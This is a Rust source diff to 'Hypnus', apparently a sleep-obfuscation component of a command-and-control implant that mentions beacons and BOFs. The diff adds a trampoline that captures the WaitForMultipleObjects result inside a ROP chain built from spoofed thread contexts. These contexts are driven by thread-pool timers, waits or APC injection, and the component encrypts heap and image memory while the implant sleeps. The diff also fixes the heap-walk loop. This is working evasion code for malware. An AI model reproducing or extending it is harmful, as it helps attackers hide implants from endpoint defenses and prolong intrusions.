@@ -314,6 +314,22 @@ impl core::ops::BitOr for ObfMode {
 /// 
 /// This enables waiting on external handles (like pipe events) in addition to
 /// or instead of a simple timeout, supporting async BOF wakeup and SMB beacons.
+///
+/// # Wake Reason Detection
+///
+/// When using `WaitPrimitive::Handles`, the `WaitForMultipleObjects` return value
+/// is captured directly in the ROP chain via a trampoline mechanism. This provides
+/// reliable wake reason detection for both auto-reset and manual-reset events.
+///
+/// ## How It Works
+///
+/// A small trampoline function wraps the WFMO call in the ROP chain:
+/// 1. The trampoline receives a pointer to result storage as an extra parameter
+/// 2. It calls WaitForMultipleObjects with the original parameters
+/// 3. It stores RAX (the return value) to the result storage before returning
+///
+/// This ensures the WFMO result is captured before NtContinue overwrites RAX
+/// in the next ROP chain step.
 #[derive(Clone, Copy, Debug)]
 pub enum WaitPrimitive {
     /// Wait for a specified duration (original behavior).
@@ -325,6 +341,9 @@ pub enum WaitPrimitive {
     
     /// Wait on external handles with optional timeout.
     /// Uses WaitForMultipleObjects to wait on up to MAXIMUM_WAIT_OBJECTS handles.
+    ///
+    /// Wake reason detection is reliable for both auto-reset and manual-reset events
+    /// thanks to the WFMO trampoline that captures the result during ROP execution.
     Handles {
         /// Array of handles to wait on (up to 4 for stack allocation)
         handles: [*mut c_void; 4],
@@ -375,9 +394,14 @@ impl WaitPrimitive {
 }
 
 /// Indicates why the obfuscated wait returned.
+///
+/// Wake reason detection is accurate for both `WaitPrimitive::Timeout` and
+/// `WaitPrimitive::Handles` waits. For handle-based waits, the WFMO return
+/// value is captured directly in the ROP chain via a trampoline mechanism,
+/// ensuring reliable detection for both auto-reset and manual-reset events.
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub enum WakeReason {
-    /// Timeout expired (original timer-based sleep behavior)
+    /// Timeout expired (original timer-based sleep behavior).
     Timeout,
     
     /// First handle (index 0) was signaled
@@ -484,7 +508,12 @@ impl Hypnus {
     }
 
     /// Performs memory obfuscation using a thread-pool timer sequence.
-    fn timer(&mut self) -> Result<()> {
+    /// 
+    /// # Arguments
+    /// * `wfmo_result_ptr` - Optional pointer to store WaitForMultipleObjects result.
+    ///   When non-null and using `WaitPrimitive::Handles`, the WFMO result is captured
+    ///   via a trampoline during ROP chain execution.
+    fn timer(&mut self, wfmo_result_ptr: *mut u64) -> Result<()> {
         unsafe {
             // Determine if heap obfuscation and RWX memory should be use
             let heap = self.mode.contains(ObfMode::Heap);
@@ -640,6 +669,8 @@ impl Hypnus {
             // Sleep/Wait - setup based on WaitPrimitive
             // Storage for handle array (must live until ROP chain completes)
             let mut handle_storage: [*mut c_void; 4] = [null_mut(); 4];
+            // Track if we're using handle-based wait for stack parameter setup
+            let mut using_wfmo_trampoline = false;
             
             match self.wait {
                 WaitPrimitive::Timeout { seconds } => {
@@ -650,13 +681,22 @@ impl Hypnus {
                     ctxs[5].R8  = 0;
                 }
                 WaitPrimitive::Handles { handles, count, timeout_ms } => {
-                    // WFMO: WaitForMultipleObjects on external handles
+                    // Use WFMO trampoline to capture the return value
                     handle_storage = handles;
-                    ctxs[5].jmp(self.cfg, self.cfg.wait_for_multiple.into());
+                    using_wfmo_trampoline = !wfmo_result_ptr.is_null();
+                    
+                    if using_wfmo_trampoline {
+                        // Call trampoline which wraps WFMO and stores result
+                        ctxs[5].jmp(self.cfg, self.cfg.wfmo_trampoline);
+                    } else {
+                        // Direct WFMO call (result will be lost)
+                        ctxs[5].jmp(self.cfg, self.cfg.wait_for_multiple.into());
+                    }
                     ctxs[5].Rcx = count as u64;
                     ctxs[5].Rdx = handle_storage.as_ptr() as u64;
                     ctxs[5].R8  = 0; // bWaitAll = FALSE
                     ctxs[5].R9  = timeout_ms as u64;
+                    // 5th and 6th params (result_ptr, wfmo_addr) are written after spoof()
                 }
             }
 
@@ -692,6 +732,13 @@ impl Hypnus {
             // Patch old_protect into expected return slots
             ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
             ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
+            
+            // For WFMO trampoline, write 5th and 6th parameters to stack
+            // [RSP+0x28] = result_ptr, [RSP+0x30] = wfmo_addr
+            if using_wfmo_trampoline {
+                ((ctxs[5].Rsp + 0x28) as *mut u64).write(wfmo_result_ptr as u64);
+                ((ctxs[5].Rsp + 0x30) as *mut u64).write(self.cfg.wait_for_multiple.as_u64());
+            }
 
             // Schedule each CONTEXT via TpSetTimer
             for ctx in &mut ctxs {
@@ -747,7 +794,12 @@ impl Hypnus {
     ///
     /// This strategy is similar to [`Hypnus::timer`], but uses `TpSetWait`
     /// instead of `TpSetTimer` to drive the spoofed CONTEXT chain.
-    fn wait(&mut self) -> Result<()> {
+    /// 
+    /// # Arguments
+    /// * `wfmo_result_ptr` - Optional pointer to store WaitForMultipleObjects result.
+    ///   When non-null and using `WaitPrimitive::Handles`, the WFMO result is captured
+    ///   via a trampoline during ROP chain execution.
+    fn wait(&mut self, wfmo_result_ptr: *mut u64) -> Result<()> {
         unsafe {
             // Determine if heap obfuscation and RWX memory should be use
             let heap = self.mode.contains(ObfMode::Heap);
@@ -903,6 +955,8 @@ impl Hypnus {
             // Sleep/Wait - setup based on WaitPrimitive
             // Storage for handle array (must live until ROP chain completes)
             let mut handle_storage: [*mut c_void; 4] = [null_mut(); 4];
+            // Track if we're using handle-based wait for stack parameter setup
+            let mut using_wfmo_trampoline = false;
             
             match self.wait {
                 WaitPrimitive::Timeout { seconds } => {
@@ -913,13 +967,22 @@ impl Hypnus {
                     ctxs[5].R8  = 0;
                 }
                 WaitPrimitive::Handles { handles, count, timeout_ms } => {
-                    // WFMO: WaitForMultipleObjects on external handles
+                    // Use WFMO trampoline to capture the return value
                     handle_storage = handles;
-                    ctxs[5].jmp(self.cfg, self.cfg.wait_for_multiple.into());
+                    using_wfmo_trampoline = !wfmo_result_ptr.is_null();
+                    
+                    if using_wfmo_trampoline {
+                        // Call trampoline which wraps WFMO and stores result
+                        ctxs[5].jmp(self.cfg, self.cfg.wfmo_trampoline);
+                    } else {
+                        // Direct WFMO call (result will be lost)
+                        ctxs[5].jmp(self.cfg, self.cfg.wait_for_multiple.into());
+                    }
                     ctxs[5].Rcx = count as u64;
                     ctxs[5].Rdx = handle_storage.as_ptr() as u64;
                     ctxs[5].R8  = 0; // bWaitAll = FALSE
                     ctxs[5].R9  = timeout_ms as u64;
+                    // 5th and 6th params (result_ptr, wfmo_addr) are written after spoof()
                 }
             }
 
@@ -955,6 +1018,13 @@ impl Hypnus {
             // Patch old_protect into expected return slots
             ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
             ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
+            
+            // For WFMO trampoline, write 5th and 6th parameters to stack
+            // [RSP+0x28] = result_ptr, [RSP+0x30] = wfmo_addr
+            if using_wfmo_trampoline {
+                ((ctxs[5].Rsp + 0x28) as *mut u64).write(wfmo_result_ptr as u64);
+                ((ctxs[5].Rsp + 0x30) as *mut u64).write(self.cfg.wait_for_multiple.as_u64());
+            }
 
             // Schedule each CONTEXT via TpAllocWait
             for ctx in &mut ctxs {
@@ -1007,7 +1077,12 @@ impl Hypnus {
     }
 
     /// Performs memory obfuscation using APC injection and hijacked thread contexts.
-    fn foliage(&mut self) -> Result<()> {
+    /// 
+    /// # Arguments
+    /// * `wfmo_result_ptr` - Optional pointer to store WaitForMultipleObjects result.
+    ///   When non-null and using `WaitPrimitive::Handles`, the WFMO result is captured
+    ///   via a trampoline during ROP chain execution.
+    fn foliage(&mut self, wfmo_result_ptr: *mut u64) -> Result<()> {
         unsafe {
             // Determine if heap obfuscation and RWX memory should be use
             let heap = self.mode.contains(ObfMode::Heap);
@@ -1117,6 +1192,8 @@ impl Hypnus {
             // Sleep/Wait - setup based on WaitPrimitive
             // Storage for handle array (must live until ROP chain completes)
             let mut handle_storage: [*mut c_void; 4] = [null_mut(); 4];
+            // Track if we're using handle-based wait for stack parameter setup
+            let mut using_wfmo_trampoline = false;
             
             match self.wait {
                 WaitPrimitive::Timeout { seconds } => {
@@ -1127,13 +1204,22 @@ impl Hypnus {
                     ctxs[5].R8  = 0;
                 }
                 WaitPrimitive::Handles { handles, count, timeout_ms } => {
-                    // WFMO: WaitForMultipleObjects on external handles
+                    // Use WFMO trampoline to capture the return value
                     handle_storage = handles;
-                    ctxs[5].Rip = self.cfg.wait_for_multiple.into();
+                    using_wfmo_trampoline = !wfmo_result_ptr.is_null();
+                    
+                    if using_wfmo_trampoline {
+                        // Call trampoline which wraps WFMO and stores result
+                        ctxs[5].Rip = self.cfg.wfmo_trampoline;
+                    } else {
+                        // Direct WFMO call (result will be lost)
+                        ctxs[5].Rip = self.cfg.wait_for_multiple.into();
+                    }
                     ctxs[5].Rcx = count as u64;
                     ctxs[5].Rdx = handle_storage.as_ptr() as u64;
                     ctxs[5].R8  = 0; // bWaitAll = FALSE
                     ctxs[5].R9  = timeout_ms as u64;
+                    // 5th and 6th params (result_ptr, wfmo_addr) are written after spoof()
                 }
             }
 
@@ -1169,6 +1255,13 @@ impl Hypnus {
             // Write `old_protect` values into the expected return slots
             ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
             ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
+            
+            // For WFMO trampoline, write 5th and 6th parameters to stack
+            // [RSP+0x28] = result_ptr, [RSP+0x30] = wfmo_addr
+            if using_wfmo_trampoline {
+                ((ctxs[5].Rsp + 0x28) as *mut u64).write(wfmo_result_ptr as u64);
+                ((ctxs[5].Rsp + 0x30) as *mut u64).write(self.cfg.wait_for_multiple.as_u64());
+            }
 
             // Queue each CONTEXT as an APC to be executed in sequence
             for ctx in &mut ctxs {
@@ -1240,6 +1333,7 @@ pub mod __private {
                     hypnus: Box::new(hypnus),
                     obf,
                     master,
+                    wfmo_result_ptr: null_mut(), // No handle-based wait
                 });
 
                 // Creates a new fiber with 1MB stack, pointing to the `hypnus_fiber` function.
@@ -1265,6 +1359,12 @@ pub mod __private {
     }
     
     /// Execution sequence with custom wait primitive, returns which handle was signaled.
+    ///
+    /// # Wake Reason Detection
+    ///
+    /// The returned `WakeReason` indicates which handle (if any) caused the wait to complete.
+    /// This uses a trampoline mechanism to capture the WFMO return value directly in the
+    /// ROP chain, avoiding the race condition that existed with post-hoc polling.
     pub fn hypnus_entry_with_wait(
         base: *mut c_void, 
         size: u64, 
@@ -1279,10 +1379,21 @@ pub mod __private {
 
         match Hypnus::new_with_wait(base as u64, size, wait, mode) {
             Ok(hypnus) => {
-                // Store the wait primitive for later wake reason calculation
+                // Storage for WFMO result - initialized to WAIT_TIMEOUT as fallback.
+                // The WFMO trampoline will store the actual result here during ROP execution.
+                let mut wfmo_result: u64 = WAIT_TIMEOUT as u64;
+                
+                // Determine handle count for wake reason conversion
                 let handle_count = match wait {
                     WaitPrimitive::Timeout { .. } => 0,
                     WaitPrimitive::Handles { count, .. } => count,
+                };
+                
+                // Set result pointer only for handle-based waits
+                let wfmo_result_ptr = if handle_count > 0 {
+                    &mut wfmo_result as *mut u64
+                } else {
+                    null_mut()
                 };
                 
                 // Creates the context to be passed into the new fiber.
@@ -1290,6 +1401,7 @@ pub mod __private {
                     hypnus: Box::new(hypnus),
                     obf,
                     master,
+                    wfmo_result_ptr,
                 });
 
                 // Creates a new fiber with 1MB stack, pointing to the `hypnus_fiber` function.
@@ -1307,36 +1419,15 @@ pub mod __private {
                 DeleteFiber(fiber);
                 ConvertFiberToThread();
                 
-                // Determine wake reason by checking which handle is signaled
                 // For timeout-based waits, always return Timeout
                 if handle_count == 0 {
                     return WakeReason::Timeout;
                 }
                 
-                // For handle-based waits, check each handle
-                if let WaitPrimitive::Handles { handles, count, .. } = wait {
-                    for i in 0..count {
-                        // Check if this handle is signaled (non-blocking wait)
-                        let result = WaitForMultipleObjects(
-                            1,
-                            &handles[i] as *const _ as *const *mut c_void,
-                            0,
-                            0, // Don't wait
-                        );
-                        if result == WAIT_OBJECT_0 {
-                            return match i {
-                                0 => WakeReason::Handle0,
-                                1 => WakeReason::Handle1,
-                                2 => WakeReason::Handle2,
-                                3 => WakeReason::Handle3,
-                                _ => WakeReason::Error,
-                            };
-                        }
-                    }
-                }
-                
-                // No handle was signaled, must have been timeout
-                WakeReason::Timeout
+                // For handle-based waits, use the captured WFMO result.
+                // The trampoline stored the actual return value during ROP chain execution,
+                // so this works correctly for both auto-reset and manual-reset events.
+                WakeReason::from_wfmo_result(wfmo_result as u32, handle_count)
             }
             Err(_error) => {
                 #[cfg(debug_assertions)]
@@ -1351,6 +1442,10 @@ pub mod __private {
         hypnus: Box<Hypnus>,
         obf: Obfuscation,
         master: *mut c_void,
+        /// Pointer to storage for WaitForMultipleObjects result.
+        /// When non-null, the WFMO trampoline stores the result here during ROP chain execution.
+        /// This solves the race condition where RAX would be lost before we could read it.
+        wfmo_result_ptr: *mut u64,
     }
 
     /// Trampoline function executed inside the fiber.
@@ -1360,10 +1455,11 @@ pub mod __private {
     extern "system" fn hypnus_fiber(ctx: *mut c_void) {
         unsafe {
             let mut ctx = Box::from_raw(ctx as *mut FiberContext);
+            let wfmo_result_ptr = ctx.wfmo_result_ptr;
             let _result = match ctx.obf {
-                Obfuscation::Timer   => ctx.hypnus.timer(),
-                Obfuscation::Wait    => ctx.hypnus.wait(),
-                Obfuscation::Foliage => ctx.hypnus.foliage(),
+                Obfuscation::Timer   => ctx.hypnus.timer(wfmo_result_ptr),
+                Obfuscation::Wait    => ctx.hypnus.wait(wfmo_result_ptr),
+                Obfuscation::Foliage => ctx.hypnus.foliage(wfmo_result_ptr),
             };
 
             #[cfg(debug_assertions)]
@@ -1396,8 +1492,10 @@ fn obfuscate_heap(key: &[u8; 8]) {
     }
 
     // Walk through all heap entries
+    // RtlWalkHeap returns STATUS_SUCCESS (0) for each successful heap entry enumeration,
+    // and a non-zero NTSTATUS when enumeration is complete or an error occurs
     let mut entry = unsafe { zeroed::<RTL_HEAP_WALK_ENTRY>() };
-    while RtlWalkHeap(heap, &mut entry) != 0 {
+    while RtlWalkHeap(heap, &mut entry) == 0 {
         // Check if the entry is in use (allocated block)
         if entry.Flags & 4 != 0 {
             xor(entry.DataAddress as *mut u8, entry.DataSize, key);
